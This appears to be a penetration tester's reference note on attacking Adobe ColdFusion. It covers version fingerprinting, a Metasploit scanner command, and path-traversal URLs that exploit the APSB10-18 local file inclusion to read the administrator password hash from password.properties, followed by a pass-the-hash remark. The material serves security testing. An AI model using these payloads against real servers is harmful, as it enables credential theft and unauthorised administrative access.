# Web applications - Software ColdFusion

### Overview

Adobe ColdFusion is a commercial web application development platform created
in 1995 which uses the programming language ColdFusion Markup Language (CFML).
Indeed, Adobe ColdFusion implements an engine which process the CFML files
(.cfm, .cfc).

Adobe ColdFusion can be run on Windows, Linux, Solaris, etc. and IIS, Apache,
etc. ColdFusion runs be default as `NT AUTHORITY\ SYSTEM` on Windows and
`nobody` on Linux.

While Adobe ColdFusion used to have a wider adoption, ColdFusion is used, as of
2019, by approximately 0.5% of all the public websites. Its main use cases
remains for intranets and niche web applications development. In 2012 the
`Google` search query `inurl:index.cfm` returned more than 750 millions results,
corresponding to approximately the same number of ColdFusion websites, while in
2019 it only returns around 30 millions results.

As of January 2019, the last Adobe ColdFusion version is `ColdFusion 2018`.

### Network scan and basic recon

###### Network scan

###### Version disclosure

The `adminapi` may be accessible and used to disclose the precise version being
used:

```
<http | https>://<HOSTNAME>:<PORT>/CFIDE/adminapi/base.cfc?wsdl

# <!--WSDL created by ColdFusion version X,X,X,X-->
```

The `Metasploit` module `auxiliary/scanner/http/coldfusion_version` can be used
to retrieve to the ColdFusion version in use:

The module relies on versions, author or copyright information that could be
disclosed in a Adobe ColdFusion core page body
(`/CFIDE/administrator/index.cfm`).

```
msf> use auxiliary/scanner/http/coldfusion_version
```

###### Standard vs Enterprise editions

The standard Adobe ColdFusion edition does not support `Javascript`.

Requesting a non-existing `jsp` file (such as /non-existing-randomnumber.jsp)
will thus give two different error messages depending on the edition used:

  - *Error HTTP 500 Internal server error* will be returned for a standard
    edition
  - *Error HTTP 404 Not Found* will be returned for an enterprise edition

###### ColdFusion default URL

### Known vulnerabilities

The `CVE Details` web page can be consulted for an updated list of the known
vulnerabilities discovered on Adobe ColdFusion:

```
https://www.cvedetails.com/product/8739/Adobe-Coldfusion.html
```

###### APSB10-18 Local File Inclusion

On Adobe ColdFusion MX6, MX7, 8.0, 8.0.1, 9.0, 9.0.1 with out the APSB10-18 patch,
released in August 2010, a local file inclusion vulnerability may be leveraged
to retrieve the administrator password SHA1 hash from the `password.properties`
file.

No patches were released for the Adobe ColdFusion MX6 and MX7 as theses
versions were end of life support at the time of the vulnerability discovery.    

If the local file inclusion could be successfully exploited, the password SHA1
hash will be displayed on the administrative login page.

```
# ColdFusion 6
<http | https>://<HOSTNAME>:<PORT>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%en

# ColdFusion 7

<http | https>://<HOSTNAME>:<PORT>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%en

# ColdFusion 8

<http | https>://<HOSTNAME>:<PORT>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en

# All versions
<http | https>://<HOSTNAME>:<PORT>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%en
```

Note that, in some cases, the hash does not need to be cracked as a
Pass-the-Hash authentication may be possible.

###### Client-side injection - cross-site scripting (XSS)

Multiples cross-site scripting vulnerabilities have been discovered over the
year on Adobe ColdFusion, for a total number of 31 discoveries as of
January 2019.  

###### Server-side injection - SQL injections (SQLi)

While no publicly known SQL injection are present on the Adobe ColdFusion core,
custom CF pages may be vulnerable to SQL injections.

Refer to the `[WebApps] SQL injections` notes for more information on how to
discover and exploit SQL injections flaws.   

### Administrator interface to RCE
